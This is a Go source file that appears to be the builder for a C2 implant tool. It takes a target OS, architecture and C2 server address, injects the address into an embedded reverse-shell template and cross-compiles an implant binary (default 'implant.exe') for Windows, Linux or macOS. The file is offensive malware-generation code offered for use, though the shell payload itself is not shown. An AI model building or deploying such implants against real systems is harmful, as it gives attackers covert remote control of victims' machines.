package main

import (
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"

	"github.com/gobuffalo/packr"
)

const (
	templateC2 = "__c2__"
)

var (
	supportedPlatforms = []string{"windows", "linux", "darwin"}
)

func main() {
	osPtr := flag.String("os", "", "target operating system")
	archPtr := flag.String("arch", "amd64", "target cpu architecture")
	c2 := flag.String("c2", "127.0.0.1:1337", "c2 server")
	output := flag.String("output", "implant.exe", "output file")
	flag.Parse()

	log.Printf("extracting assets ...")
	gshellDir := setup()
	defer func() {
		log.Printf("cleaning up assets in: %s", gshellDir)
		noCleanPtr := flag.Bool("no-clean", false, "do not cleanup tmp files")
		if !(*noCleanPtr) {
			os.RemoveAll(gshellDir)
		}
	}()
	log.Printf("extracted assets to: %s", gshellDir)

	config := GoConfig{
		GOOS:   *osPtr,
		GOARCH: *archPtr,
		GOROOT: fmt.Sprintf("%s/go", gshellDir),
	}
	generateImplant(gshellDir, *c2, *output, config)
}

func generateImplant(gshellDir string, c2 string, output string, config GoConfig) {

	shellID := randomID(8)
	log.Printf("creating shell with ID: %s", shellID)
	shellBox := packr.NewBox("./assets/shell")

	shellGo, err := shellBox.MustString("shell.go")
	if err != nil {
		panic(err)
	}
	shellGo = strings.Replace(shellGo, templateC2, c2, -1)
	log.Printf("rendered shell with c2 = '%s'", c2)

	shellDir := fmt.Sprintf("%s/shells/%s", gshellDir, shellID)
	err = os.MkdirAll(shellDir, os.ModePerm)
	if err != nil {
		panic(err)
	}

	log.Printf("shell dir: %s", shellDir)
	ioutil.WriteFile(fmt.Sprintf("%s/shell.go", shellDir), []byte(shellGo), 0600)
	for _, platform := range supportedPlatforms {
		shellPlatform, _ := shellBox.MustBytes(fmt.Sprintf("shell_%s.go", platform))
		ioutil.WriteFile(fmt.Sprintf("%s/shell_%s.go", shellDir, platform), shellPlatform, 0600)
	}

	cwd, _ := os.Getwd()
	gobuild(config, shellDir, fmt.Sprintf("%s/%s", cwd, output))
}

func randomID(n int) string {
	bytes := make([]byte, n)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}
